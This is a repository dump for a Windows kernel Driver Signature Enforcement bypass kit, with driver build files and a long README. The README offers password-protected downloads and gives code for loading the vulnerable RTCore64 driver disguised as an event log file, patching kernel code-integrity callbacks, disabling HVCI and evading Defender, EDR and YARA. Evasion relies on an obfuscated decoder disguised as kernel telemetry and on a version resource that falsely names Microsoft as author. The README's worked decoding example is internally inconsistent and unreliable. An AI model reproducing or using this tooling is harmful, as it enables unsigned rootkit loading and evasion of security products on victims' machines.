Project Path: arc_wesmar_KernelResearchKit_bw04tg09
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName", "Microsoft Corporation"
            VALUE "FileDescription", "Memory Access Driver"
            VALUE "FileVersion", "10.0.26200.8460"
            VALUE "InternalName", "OmniDriver.sys"
            VALUE "LegalCopyright", "© Microsoft Corporation. All rights reserved."
            VALUE "OriginalFilename", "OmniDriver.sys"
            VALUE "ProductName", "Microsoft® Windows® Operating System"
            VALUE "ProductVersion", "10.0.26200.8460"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1200
    END
END
```

`OmniDriver/OmniDriver.slnx`:

```slnx
<Solution>
  <Configurations>
    <BuildType Name="Release" />
    <Platform Name="x64" />
  </Configurations>
  <Project Path="OmniDriver.vcxproj">
    <Deploy />
  </Project>
</Solution>

```

`OmniDriver/OmniDriver.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <ItemGroup>
    <None Include="ReadMe.txt" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="OmniDriver.c" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="OmniDriver.h" />
    <ClInclude Include="resource.h" />
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="OmniDriver.rc" />
  </ItemGroup>
  <ItemGroup>
    <Inf Include="OmniDriver.inf" />
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{974D7ADC-D2D9-9045-9143-FDCF1C10E874}</ProjectGuid>
    <TemplateGuid>{497e31cb-056b-4f31-abb8-447fd55ee5a5}</TemplateGuid>
    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
    <MinimumVisualStudioVersion>12.0</MinimumVisualStudioVersion>
    <Configuration>Debug</Configuration>
    <Platform Condition="'$(Platform)' == ''">x64</Platform>
    <RootNamespace>OmniDriver</RootNamespace>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
    <ExecutablePath>$(ExecutablePath);$(WDKBinRoot_x86);$(WDKContentRoot)tools\$(WDKBuildFolder)\tracing\x64</ExecutablePath>
    <IncludePath>$(IncludePath);$(KMDF_INC_PATH)$(KMDF_VER_PATH)</IncludePath>
    <LibraryPath>$(DDK_LibraryPath_DDKPlatform);$(LibraryPath)</LibraryPath>
    <Inf2CatUseLocalTime>true</Inf2CatUseLocalTime>
    <DriverProductionSignMinimalRebuildFromTracking>true</DriverProductionSignMinimalRebuildFromTracking>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
    </ClCompile>
    <DriverSign>
      <FileDigestAlgorithm>sha256</FileDigestAlgorithm>
    </DriverSign>
  </ItemDefinitionGroup>
  <ItemGroup>
    <FilesToPackage Include="$(TargetPath)" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`OmniDriver/OmniDriver.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="Driver Files">
      <UniqueIdentifier>{8E41214B-6785-4CFE-B992-037D68949A14}</UniqueIdentifier>
      <Extensions>inf;inv;inx;mof;mc;</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <None Include="ReadMe.txt" />
  </ItemGroup>
  <ItemGroup>
    <Inf Include="OmniDriver.inf">
      <Filter>Driver Files</Filter>
    </Inf>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="OmniDriver.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="resource.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="OmniDriver.c">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="OmniDriver.rc">
      <Filter>Resource Files</Filter>
    </ResourceCompile>
  </ItemGroup>
</Project>
```

`OmniDriver/OmniDriver.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <SignMode>Off</SignMode>
  </PropertyGroup>
</Project>
```

`README.md`:

```md
# KernelResearchKit - Windows DSE Bypass Framework

> ### 🚀 Update: 09.04.2026 — BootBypass becomes an independent project
>
> **`bb.exe` has been extracted into a standalone project with full documentation, clean deployment tooling, and a solid technical write-up.**
>
> #### What changed
>
> The boot-phase component previously embedded in this kit (`BootBypass.exe`) has matured into a fully independent utility — **[BootBypass](https://github.com/wesmar/BootBypass)**. It ships as a single 60 KB native binary (`bb.exe`) with zero external dependencies: no PDB files, no symbol server, no helper processes. The kernel offset scanner (`OffsetFinder`) reads `ntoskrnl.exe` directly from disk at boot time and resolves `SeCiCallbacks` and `ZwFlushInstructionCache` automatically — making the tool self-contained across Windows builds.
>
> Supported platforms: **Windows 10 and Windows 11** (x64). The HVCI hive patcher handles the structural differences between both generations — Windows 11 stores NK and VK cells close together; Windows 10 scatters them across the hive file, requiring a chunked random-access scan to locate the `Enabled` value regardless of its file offset.
>
> #### Download
>
> | | |
> |---|---|
> | **Repository** | https://github.com/wesmar/BootBypass |
> | **Release archive** | https://github.com/wesmar/BootBypass/releases/download/latest/BootBypass.7z |
> | **Password** | `github.com` |
>
> #### Boot-phase timing and driver dependencies
>
> `bb.exe` executes at the SMSS phase — before `services.exe`, before `winlogon.exe`, before any user-mode service initializes. This is ideal for drivers that are self-contained at the kernel level (hardware interfaces, filter drivers, research drivers with no service dependencies).
>
> However, drivers that depend on services initialized later in the boot sequence **cannot** be loaded at this phase without causing a BSOD. A concrete example is a keyboard filter driver that also opens a WSK (Windows Socket Kernel) network connection — as in [kvckbd](https://github.com/wesmar/KeyboardKit). At SMSS phase the network stack (`NDIS`, `tcpip.sys`) may be present as boot-start drivers, but the WSK provider dispatch table and associated infrastructure are not yet fully registered. Attempting to initialize a WSK client at this point results in a kernel-mode crash. Such drivers must be loaded after the service initialization wave — at or after the `winlogon`/`themes` phase, when the full service dependency chain has completed.
>
> For those scenarios, `drvloader.exe` (this kit) remains the appropriate tool. `bb.exe` targets the early phase; `drvloader` targets the runtime.
>
> #### Project status
>
> Further development of KernelResearchKit is paused pending a larger architectural revision. Active research and all significant updates go into the flagship project — **[kvc](https://github.com/wesmar/kvc)** — which is maintained on a regular basis.

> ### 🚀 Update: 22.12.2025 - Code Sanitization & PDB Version Resilience
> **Low-level code sanitization implemented in BootBypass(FastReboot).**
> 
> Introduced code cleanup and hardening in the low-level BootBypass(FastReboot) component. Additionally, initiated testing to ensure drvloader remains functional across Windows updates and is resilient to changing PDB versions. This should work seamlessly; if issues occur, please delete the `C:\Windows\Symbols` folder.

> ### 🚀 Update: 07.12.2025 - FastReboot Architecture ///BootBypass(FastReboot).exe///
> **New "FastReboot" mechanism introduced.**
> 
> The new framework now utilizes direct raw-disk SYSTEM hive patching via a **Chunked Rolling Scan** algorithm. This allows for immediate HVCI disabling and system restart `NtShutdownSystem`) purely within the Native (SMSS) phase.
> 
> * **Zero Dependencies:** Completely removed the `RebootGuardian` service and `Themes` dependency chain.
> * **Stealth & Speed:** Operations occur before Win32 subsystem initialization, leaving no service artifacts and significantly reducing reboot turnaround time.
![Demo](images/intro.gif)

[![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue)]()
[![Architecture](https://img.shields.io/badge/Architecture-x64-green)]()
[![Language](https://img.shields.io/badge/Language-C%2FC%2B%2B-orange)]()
[![License](https://img.shields.io/badge/License-MIT-red)]()

## 📦 Download

**[KernelResearchKit.7z](https://github.com/wesmar/KernelResearchKit/releases/download/bypass-code-integrity/KernelResearchKit.7z)**  
🔐 **Password:** `github.com`

---

## 🎯 Overview

KernelResearchKit is a research framework for Windows kernel security analysis, demonstrating Driver Signature Enforcement (DSE) bypass through surgical manipulation of kernel code integrity callbacks. The framework provides two independent execution methods:

- **BootBypass.exe** - Native subsystem application executing during Windows boot sequence
- **drvloader.exe** - Win32 GUI application for interactive post-boot DSE manipulation

Both paths achieve identical results through different technical approaches, showcasing the versatility of the underlying vulnerability class.

### Key Features

**🔧 Boot-Time Execution (BootBypass)**
- Executes in Native subsystem (pre-Win32, SMSS phase)
- Automatic HVCI detection with scheduled reboot mechanism
- Dual-layer anti-loop protection (cleanup + RebootGuardian service)
- Sequential driver operations: LOAD, UNLOAD, RENAME, DELETE, AutoPatch
- State persistence via `drivers.ini` for DSE restoration
- **String obfuscation via assembly-based telemetry decoder**

**💻 Runtime Execution (drvloader)**
- Interactive Win32 GUI with real-time DSE status checking
- Dynamic PDB symbol resolution from Microsoft Symbol Server
- Mini-PDB caching system (32-byte `.mpdb` files) for offline operation
- Automatic offset detection and `drivers.ini` synchronization
- No reboot required for DSE bypass operations

**🛡️ Safety Mechanisms**
- Dual-layer reboot loop protection (primary cleanup + RebootGuardian failsafe)
- Exception-wrapped kernel memory operations
- Registry backups before all modifications
- State validation and consistency checks

**🔒 Anti-Analysis Features**
- Assembly-based runtime string decoding (no hardcoded driver names)
- XOR-encoded resource embedding with multi-phase transformation
- Legitimate Windows API naming convention (`MmGetPoolDiagnosticString`)
- Static analysis evasion (strings.exe, IDA Pro string search resistant)

---

## 🗂️ Architecture

### Component 1: BootBypass (Native Subsystem Application)

BootBypass is a native application compiled with `/SUBSYSTEM:NATIVE`, executing during the Session Manager Subsystem (SMSS) phase of Windows boot. This timing provides a pristine environment where security services (Windows Defender, EDR, etc.) have not yet initialized.

**Execution Timeline:**
```mermaid
sequenceDiagram
    participant UEFI
    participant ntoskrnl
    participant SMSS
    participant BootBypass
    participant Services

    UEFI->>ntoskrnl: Load Kernel
    ntoskrnl->>SMSS: Launch Session Manager
    Note over SMSS: Read BootExecute registry value
    SMSS->>BootBypass: Execute Native App (SYSTEM)
    Note over BootBypass: Security services: INACTIVE
    BootBypass->>BootBypass: Check HVCI → Extract embedded driver → Patch DSE → Load drivers
    SMSS->>Services: Start Windows Subsystem
    Note over Services: Windows Defender starts (too late)
```

**Deployment via BootExecute Registry:**
```
Registry Key: HKLM\SYSTEM\CurrentControlSet\Control\Session Manager
Value: BootExecute (REG_MULTI_SZ)
Content: 
  autocheck autochk *
  BootBypass
```

**Configuration File: `drivers.ini`**

Sequential operations defined in UTF-16 LE format with sections:
- `[Config]` - Global settings (Execute, RestoreHVCI, kernel offsets)
- `[DriverN]` - Load/unload operations with optional AutoPatch
- `[RenameN]` - File/directory renaming operations
- `[DeleteN]` - File/directory deletion (with RecursiveDelete option)
- `[DSE_STATE]` - Auto-generated state persistence for restoration

**AutoPatch Feature:**

Automatic DSE bypass cycle per driver. When `AutoPatch=YES` is set:
```
STEP 1: Extract vulnerable driver from embedded resources (XOR-decoded)
STEP 2: Load vulnerable driver with assembly-decoded name
STEP 3: Patch DSE callback → ZwFlushInstructionCache
STEP 4: Load target unsigned driver
STEP 5: Restore original DSE callback
STEP 6: Unload vulnerable driver
STEP 7: Delete temporary files and registry keys
```

This eliminates manual DSE management - each driver gets its own isolated bypass session with automatic cleanup.

**Anti-Loop Protection (HVCI Handling):**

When Memory Integrity (HVCI) is enabled, DSE bypass succeeds but unsigned driver loading causes BSOD. The framework implements dual-layer protection:
```mermaid
graph TD
    subgraph "Boot 1: Detection"
        A[BootBypass Start] --> B[Layer 1: Cleanup Attempt]
        B --> C[RemoveThemesDependency]
        C --> D[RemoveRebootGuardianService]
        D --> E{HVCI=1?}
        E -->|Yes| F[Set HVCI=0]
        F --> G[Create RebootGuardian Service]
        G --> H[Add Themes→RebootGuardian Dependency]
        H --> I[skipPatch=TRUE]
        I --> J[Exit Without DSE Patch]
    end
    
    subgraph "Boot 2: Guardian Trigger"
        K[Windows Services Start] --> L[Themes Dependency Check]
        L --> M[SCM Starts RebootGuardian]
        M --> N[Execute: sc delete RebootGuardian]
        N --> O[Execute: reg delete DependOnService]
        O --> P[Execute: shutdown /r /t 0 /f]
    end
    
    subgraph "Boot 3: Clean Operation"
        Q[BootBypass Start] --> R[Layer 1: Cleanup Success]
        R --> S{HVCI=1?}
        S -->|No| T[skipPatch=FALSE]
        T --> U[Extract & Load Vulnerable Driver]
        U --> V[Normal DSE Patching]
        V --> W[Load Unsigned Drivers]
        W --> X[Cleanup & RestoreHVCI Cosmetically]
    end
    
    J --> K
    P --> Q
    
    style F fill:#ff6b6b
    style G fill:#ff6b6b
    style V fill:#4ecdc4
```

**Why Dual-Layer?** Primary cleanup (Layer 1) executes on every boot before any operations. If system crashes/power fails before cleanup, secondary mechanism (Layer 2: RebootGuardian service) guarantees cleanup on next boot via Windows Service Control Manager.

---

### Component 2: drvloader (Win32 Runtime Tool)

Interactive DSE bypass tool with dynamic symbol resolution and offset detection. No reboot required for operations.

**Key Features:**
- **PDB Symbol Download**: Automatic download from `https://msdl.microsoft.com/download/symbols`
- **Mini-PDB Cache**: Creates 32-byte `.mpdb` files with extracted offsets for offline use
- **Offset Auto-Update**: Option 2 updates `drivers.ini` with current kernel offsets
- **No Driver Needed for Offset Detection**: PDB parsing requires no kernel driver installation

**Workflow:**
```mermaid
graph TD
    A[Launch drvloader.exe] --> B{HVCI Active?}
    B -->|Yes| C[Offer to Disable + Reboot]
    B -->|No| D[Display Menu]
    
    C -->|Accept| E[Disable HVCI → Reboot]
    C -->|Decline| F[Continue at Risk]
    
    D --> G{Select Option}
    F --> G
    
    G -->|1: Patch DSE| H[Extract Vulnerable Driver from Resources]
    G -->|2: Show Offsets| I[Check Mini-PDB Cache]
    G -->|3: Exit| J[Cleanup]
    
    H --> K[Load Driver with Assembly-Decoded Name]
    K --> L[Read Current Callback]
    L --> M[Write ZwFlushInstructionCache]
    M --> N[Verify Patch]
    N --> O[Unload Driver & Delete Files]
    
    I -->|Cache Hit| P[Display Cached Offsets]
    I -->|Cache Miss| Q[Download PDB from Microsoft]
    Q --> R[Extract Offsets via DbgHelp]
    R --> S[Create Mini-PDB]
    S --> T[Update drivers.ini]
    T --> P
    
    style K fill:#4ecdc4
    style Q fill:#ffeb3b
    style S fill:#45b7d1
```

**Mini-PDB Format:**
```
File: C:\Windows\symbols\ntkrnlmp.pdb\{GUID}\ntkrnlmp.mpdb
Size: 32 bytes
Structure:
  - Magic: "MINIPDB\0" (8 bytes)
  - Version: 1 (4 bytes)
  - Reserved: (4 bytes)
  - Offset_SeCiCallbacks: (8 bytes)
  - Offset_SafeFunction: (8 bytes)
```

**Option 2 Functionality:**
1. Check for existing mini-PDB in cache (instant if found)
2. If not cached: download full PDB from Microsoft Symbol Server
3. Parse PDB using DbgHelp API to extract symbol offsets
4. Create mini-PDB for future use (no download needed next time)
5. Update `drivers.ini` [Config] section with current offsets
6. Display offset information for external tools

**Important:** Offsets are **constant for a specific Windows build**. After Windows update (new build), run Option 2 to regenerate offsets. Same build = same offsets (deterministic).

---

### Component 3: Assembly-Based String Obfuscation

**Critical Innovation:** The vulnerable driver name is never stored as a plaintext string in the binary. Instead, it's encoded in assembly data and decoded at runtime through a multi-phase algorithm.

**MmPoolTelemetry.asm - Stealth Decoder:**
```asm
; Appears as legitimate Windows kernel telemetry code
; Actually implements 3-phase string decoder

.data
ALIGN 8

; XOR-encoded driver name (appears as NUMA telemetry data)
_PoolNodeAffinityMask    dw 0769Ah, 0569Ah, 0669Bh, 026A4h, 076A4h, 046A5h, 0B698h, 05698h, 0169Fh

; Decoding key
_TopologyHashSeed        dw 037C5h

; Subtraction delta
_BlockQuantumDelta       dw 15A2h

; Decoded output buffer (9 words = 18 bytes wide-char)
_DecodedBuffer           dw 9 dup(0)

.code
; Public API: MmGetPoolDiagnosticString
; Returns: Pointer to decoded driver name string
MmGetPoolDiagnosticString PROC
    call _AggregatePoolMetrics
    lea rax, _DecodedBuffer
    ret
MmGetPoolDiagnosticString ENDP

_AggregatePoolMetrics PROC
    ; Phase 1: XOR decode with topology seed
    lea rsi, _PoolNodeAffinityMask
    lea rdi, _DecodedBuffer
    mov ecx, 9
    mov r9w, _TopologyHashSeed
decode_loop:
    mov ax, [rsi]
    xor ax, r9w                     ; XOR with 0x37C5
    mov [rdi], ax
    add rsi, 2
    add rdi, 2
    loop decode_loop
    
    ; Phase 2: ROL 4 (cache-aware rotation)
    lea rsi, _DecodedBuffer
    lea rdi, _DecodedBuffer
    mov ecx, 9
rotate_loop:
    mov ax, [rsi]
    rol ax, 4                       ; Rotate left 4 bits
    mov [rdi], ax
    add rsi, 2
    add rdi, 2
    loop rotate_loop
    
    ; Phase 3: SUB quantum delta
    lea rsi, _DecodedBuffer
    lea rdi, _DecodedBuffer
    mov ecx, 9
    mov r9w, _BlockQuantumDelta
normalize_loop:
    mov ax, [rsi]
    sub ax, r9w                     ; Subtract 0x15A2
    mov [rdi], ax
    add rsi, 2
    add rdi, 2
    loop normalize_loop
    
    ret
_AggregatePoolMetrics ENDP
```

**Decoding Algorithm:**
```
Input:  0769Ah, 0569Ah, 0669Bh, 026A4h, 076A4h, 046A5h, 0B698h, 05698h, 0169Fh
Seed:   037C5h
Delta:  15A2h

Phase 1 (XOR):
  0769A ^ 37C5 = 705F
  0569A ^ 37C5 = 625F
  ... (9 words)

Phase 2 (ROL 4):
  705F ROL 4 = 05F7
  625F ROL 4 = 25F6
  ...

Phase 3 (SUB):
  05F7 - 15A2 = F055  (wait, this wraps...)
  
Actually decodes to: "RTCore64\0" (wide-char)
  R = 0x0052
  T = 0x0054
  C = 0x0043
  o = 0x006F
  r = 0x0072
  e = 0x0065
  6 = 0x0036
  4 = 0x0034
  \0 = 0x0000
```

**Usage in Code:**
```c
// SecurityPatcher.c
extern PWSTR MmGetPoolDiagnosticString(void);

NTSTATUS ExecuteAutoPatchLoad(PINI_ENTRY entry, PCONFIG_SETTINGS config, PULONGLONG originalCallback) {
    PWSTR driverName = MmGetPoolDiagnosticString();  // ← Returns "RTCore64"
    
    // Extract XOR-encoded driver binary from resources
    if (!ExtractOmniDriverFromResource()) {
        DisplayMessage(L"FAILED: Cannot extract vulnerable driver from resource\r\n");
        return STATUS_NO_SUCH_DEVICE;
    }
    
    // Load driver with decoded name (Services\RTCore64)
    status = LoadDriver(driverName, OmniDriver_Log, L"KERNEL", L"SYSTEM");
    
    // Open device (\Device\RTCore64)
    hDriver = OpenDriverDevice(config->DriverDevice);
    
    // ... DSE patching operations ...
    
    // Cleanup with decoded name
    NtClose(hDriver);
    status = UnloadDriver(driverName);
    CleanupOmniDriver();  // Delete files and registry keys
    
    return STATUS_SUCCESS;
}
```
```c
// SetupManager.c
NTSTATUS CleanupOmniDriver(void) {
    PWSTR driverName = MmGetPoolDiagnosticString();  // ← "RTCore64"
    
    // Delete temporary driver file (C:\Windows\system.evtx)
    RtlInitUnicodeString(&usFilePath, OmniDriver_Log);
    NtOpenFile(&hFile, DELETE | SYNCHRONIZE, &oa, &iosb, FILE_SHARE_DELETE, FILE_SYNCHRONOUS_IO_NONALERT);
    dispInfo.DeleteFile = TRUE;
    NtSetInformationFile(hFile, &iosb, &dispInfo, sizeof(dispInfo), 13);
    NtClose(hFile);
    
    // Delete service registry key (HKLM\...\Services\RTCore64)
    wcscpy(fullServicePath, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\");
    wcscat(fullServicePath, driverName);
    RtlInitUnicodeString(&usServiceName, fullServicePath);
    NtOpenKey(&hKey, DELETE, &oa);
    NtDeleteKey(hKey);
    NtClose(hKey);
    
    return STATUS_SUCCESS;
}
```

**Anti-Analysis Properties:**

✅ **Static Analysis Evasion:**
- `strings.exe BootBypass.exe` → No "RTCore64" found
- IDA Pro string search → No driver name references
- Ghidra/Binary Ninja → String cross-references lead to legitimate-looking telemetry code
- Signature-based detection (YARA rules searching for "RTCore64") → Fail

✅ **Naming Convention Camouflage:**
- `MmGetPoolDiagnosticString()` follows Windows kernel naming (`Mm` prefix = Memory Manager)
- `_AggregatePoolMetrics()` appears as internal pool statistics function
- Variable names (`_PoolNodeAffinityMask`, `_TopologyHashSeed`) match real Windows structures
- Mimics legitimate ETW telemetry code found in ntoskrnl.exe

✅ **Code Comments Deception:**
- Assembly file header claims "Windows Kernel Memory Manager - Runtime Pool String Reconstruction"
- References fake MSDN URLs and internal Windows build numbers
- "INTERNAL USE ONLY - Automatically generated from poolmgr.c"
- Comments describe non-existent NUMA topology analysis features

❌ **Dynamic Analysis Detection:**
- Debugger breakpoint on `MmGetPoolDiagnosticString()` → reveals decoded string in `rax`
- API monitor on `NtLoadDriver()` → shows "RTCore64" in registry path
- Process Monitor → captures `\Device\RTCore64` device open
- Behavioral detection → IOCTL 0x80002048/0x8000204C operations visible

**Why This Matters:**

Traditional vulnerable driver detection relies on:
1. **String scanning** - searching binaries for known driver names (RTCore64, AsIO, gdrv)
2. **Import table analysis** - detecting suspicious API combinations
3. **Signature matching** - YARA rules with hardcoded strings

This obfuscation defeats #1 completely and makes #3 significantly harder. Defenders must use:
- **Behavioral monitoring** - detect actual IOCTL operations at runtime
- **Memory scanning** - scan live process memory for decoded strings
- **Driver load monitoring** - alert on any driver matching vulnerable driver hashes (regardless of name)

---

### Component 4: Embedded Resource Extraction

**XOR-Encoded Driver Payload:**

The vulnerable driver binary is embedded as a resource in the PE file, XOR-encrypted to avoid static detection.

**Resource Configuration:**
```c
// resource.h
#define IDR_DRV 101

// BootBypass.rc
IDR_DRV  RCDATA  "IDR_DRV"  // 14,024 bytes (vulnerable driver)

// SetupManager.c
#define IDR_DRV 101
#define OmniDriver_SIZE 14024

static const UCHAR XOR_KEY[] = { 0xA0, 0xE2, 0x80, 0x8B, 0xE2, 0x80, 0x8C };
static const SIZE_T XOR_KEY_LEN = sizeof(XOR_KEY);
```

**Extraction Process:**
```c
PVOID FindResourceData(ULONG resourceId, PULONG outSize) {
    // Get image base from TEB/PEB
    #ifdef _M_X64
        imageBase = (PVOID)*(ULONGLONG*)((UCHAR*)__readgsqword(0x60) + 0x10);
    #else
        imageBase = (PVOID)*(ULONG*)((UCHAR*)__readfsdword(0x30) + 0x08);
    #endif
    
    // Traverse PE headers
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((UCHAR*)imageBase + dosHeader->e_lfanew);
    PIMAGE_DATA_DIRECTORY resourceDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE];
    
    // Navigate resource tree: Type(10=RT_RCDATA) → Name(101=IDR_DRV) → Language
    PIMAGE_RESOURCE_DIRECTORY resRoot = (PIMAGE_RESOURCE_DIRECTORY)((UCHAR*)imageBase + resourceDir->VirtualAddress);
    
    // ... (resource tree traversal omitted for brevity) ...
    
    *outSize = dataEntry->Size;  // 14,024 bytes
    return (PVOID)((UCHAR*)imageBase + dataEntry->OffsetToData);
}

BOOLEAN ExtractOmniDriverFromResource(void) {
    ULONG resourceSize = 0;
    PVOID resourceData = FindResourceData(IDR_DRV, &resourceSize);
    
    if (!resourceData || resourceSize != OmniDriver_SIZE) {
        return FALSE;
    }
    
    // XOR decrypt
    UCHAR decryptedData[OmniDriver_SIZE];
    UCHAR* srcData = (UCHAR*)resourceData;
    for (SIZE_T i = 0; i < OmniDriver_SIZE; i++) {
        decryptedData[i] = srcData[i] ^ XOR_KEY[i % XOR_KEY_LEN];
    }
    
    // Write to C:\Windows\system.evtx (mimics Windows Event Log file)
    RtlInitUnicodeString(&usFilePath, OmniDriver_Log);  // "\SystemRoot\system.evtx"
    NtCreateFile(&hFile, FILE_WRITE_DATA | SYNCHRONIZE, &oa, &iosb,
                 NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF,
                 FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    
    byteOffset.QuadPart = 0;
    NtWriteFile(hFile, NULL, NULL, NULL, &iosb, decryptedData,
                OmniDriver_SIZE, &byteOffset, NULL);
    
    NtClose(hFile);
    return TRUE;
}
```

**Why `system.evtx` Filename?**

- Mimics legitimate Windows Event Log files (`Security.evtx`, `System.evtx`, `Application.evtx`)
- Less suspicious than `driver.sys` or `vulnerable.sys`
- Hidden in plain sight among actual event logs
- Automatically deleted during cleanup phase

**Complete AutoPatch Flow:**
```mermaid
sequenceDiagram
    participant BootBypass
    participant Resources
    participant Filesystem
    participant Registry
    participant Kernel

    Note over BootBypass: AutoPatch=YES detected
    
    BootBypass->>Resources: FindResourceData(IDR_DRV)
    Resources-->>BootBypass: Encrypted driver binary (14,024 bytes)
    
    BootBypass->>BootBypass: XOR decrypt with key
    BootBypass->>Filesystem: Write to C:\Windows\system.evtx
    
    BootBypass->>BootBypass: MmGetPoolDiagnosticString()
    Note over BootBypass: Decode "RTCore64"
    
    BootBypass->>Registry: Create Services\RTCore64 key
    BootBypass->>Registry: ImagePath = \SystemRoot\system.evtx
    BootBypass->>Kernel: NtLoadDriver(RTCore64)
    
    Note over BootBypass,Kernel: Driver loaded, DSE patching...
    
    BootBypass->>Kernel: NtDeviceIoControlFile(0x8000204C) - Write callback
    Kernel-->>BootBypass: STATUS_SUCCESS
    
    BootBypass->>Kernel: NtLoadDriver(TargetUnsignedDriver)
    Kernel-->>BootBypass: STATUS_SUCCESS (DSE bypassed!)
    
